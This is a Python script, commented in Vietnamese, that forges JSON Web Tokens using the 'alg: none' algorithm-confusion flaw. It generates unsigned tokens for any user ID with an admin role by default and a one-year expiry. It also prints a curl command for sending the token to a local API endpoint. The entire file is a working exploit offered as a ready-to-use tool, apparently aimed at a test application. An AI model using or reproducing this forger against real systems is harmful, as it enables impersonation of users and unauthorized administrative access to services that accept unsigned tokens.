#!/usr/bin/env python3
"""
Script khai thác lỗ hổng JWT Algorithm Confusion Attack
Sử dụng để tạo token giả mạo với algorithm "none"
"""

import base64
import json
import sys
from datetime import datetime, timedelta

def base64url_encode(data):
    """Encode data thành base64url format (không có padding)"""
    return base64.urlsafe_b64encode(
        json.dumps(data).encode()
    ).decode().rstrip('=')

def create_fake_token(user_id, role='admin', days_valid=365):
    """
    Tạo JWT token giả mạo với algorithm "none"
    
    Args:
        user_id: MongoDB ObjectId của user muốn giả mạo
        role: Role muốn gán (admin hoặc user)
        days_valid: Số ngày token có hiệu lực
    
    Returns:
        JWT token string
    """
    # Header với algorithm "none" - không cần signature
    header = {
        "alg": "none",
        "typ": "JWT"
    }
    
    # Payload với thông tin user
    now = datetime.utcnow()
    payload = {
        "userId": user_id,
        "role": role,
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(days=days_valid)).timestamp()),
        "sub": "accessApi"
    }
    
    # Encode header và payload
    header_encoded = base64url_encode(header)
    payload_encoded = base64url_encode(payload)
    
    # Token với algorithm "none" - signature là chuỗi rỗng
    token = f"{header_encoded}.{payload_encoded}."
    
    return token

def main():
    print("=" * 60)
    print("JWT Algorithm Confusion Attack - Token Generator")
    print("=" * 60)
    print()
    
    # Nhận input từ user
    if len(sys.argv) > 1:
        user_id = sys.argv[1]
    else:
        user_id = input("Nhập User ID (MongoDB ObjectId): ").strip()
    
    if len(sys.argv) > 2:
        role = sys.argv[2]
    else:
        role = input("Nhập Role (admin/user) [mặc định: admin]: ").strip() or "admin"
    
    if role not in ['admin', 'user']:
        print("Error: Role phải là 'admin' hoặc 'user'")
        sys.exit(1)
    
    # Tạo token
    token = create_fake_token(user_id, role)
    
    print()
    print("=" * 60)
    print("TOKEN GIẢ MẠO ĐÃ ĐƯỢC TẠO:")
    print("=" * 60)
    print(token)
    print()
    print("=" * 60)
    print("CÁCH SỬ DỤNG:")
    print("=" * 60)
    print(f'curl -X GET http://localhost:3000/api/v1/users/current \\')
    print(f'  -H "Authorization: Bearer {token}"')
    print()
    print("Hoặc sử dụng trong Postman/Insomnia:")
    print(f'Authorization: Bearer {token}')
    print()
    
    # Decode để xem nội dung
    try:
        parts = token.split('.')
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
        
        print("=" * 60)
        print("NỘI DUNG TOKEN:")
        print("=" * 60)
        print("Header:", json.dumps(header, indent=2))
        print()
        print("Payload:", json.dumps(payload, indent=2))
        print()
    except Exception as e:
        print(f"Lỗi khi decode token: {e}")

if __name__ == "__main__":
    main()

